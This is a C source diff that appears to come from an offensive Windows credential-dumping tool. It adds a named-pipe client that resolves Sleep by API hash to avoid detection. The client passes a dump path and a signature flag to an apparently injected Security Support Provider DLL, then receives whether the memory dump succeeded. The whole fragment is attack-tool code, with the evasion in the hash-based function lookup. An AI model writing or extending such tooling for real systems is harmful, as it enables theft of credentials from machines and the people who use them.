@@ -1,5 +1,6 @@
 #include "ssp/utils.h"
 #include "utils.h"
+#include "pipe.h"
 
 BOOL generate_random_dll_path(
     OUT LPSTR* random_path)
@@ -79,3 +80,76 @@ BOOL write_ssp_dll(
 cleanup:
     return ret_val;
 }
+
+#if PASS_PARAMS_VIA_NAMED_PIPES == 1
+
+BOOL send_parameters_and_get_result(
+    IN LPSTR dump_path,
+    IN BOOL use_valid_sig,
+    OUT PBOOL dump_worked)
+{
+    BOOL   ret_val = FALSE;
+    BOOL   success = FALSE;
+    HANDLE hPipe   = NULL;
+
+    Sleep_t Sleep = NULL;
+
+    Sleep = (Sleep_t)(ULONG_PTR)get_function_address(
+        get_library_address(KERNEL32_DLL, TRUE),
+        Sleep_SW2_HASH,
+        0);
+    if (!Sleep)
+    {
+        api_not_found("Sleep");
+        goto cleanup;
+    }
+
+    for (int i = 0; i < 5; ++i)
+    {
+        // let's try to connect to the named pipe
+        success = client_connect_to_named_pipe(
+            IPC_PIPE_NAME,
+            &hPipe);
+        if (!success)
+        {
+            // sleep half a second and try again
+            if (i != 4)
+            {
+                DPRINT("could not connnect to the named pipe, sleeping and trying again...");
+            }
+            Sleep(500);
+            continue;
+        }
+        break;
+    }
+
+    if (!success)
+    {
+        PRINT_ERR("Could not connect to the named pipe, the DLL does not seem to have been loaded");
+        goto cleanup;
+    }
+
+    success = client_send_arguments_from_pipe(
+        hPipe,
+        dump_path,
+        use_valid_sig,
+        FALSE);
+    if (!success)
+        goto cleanup;
+
+    success = client_recv_success(
+        hPipe,
+        dump_worked);
+    if (!success)
+        goto cleanup;
+
+    ret_val = TRUE;
+
+cleanup:
+    if (hPipe)
+        NtClose(hPipe);
+
+    return ret_val;
+}
+
+#endif
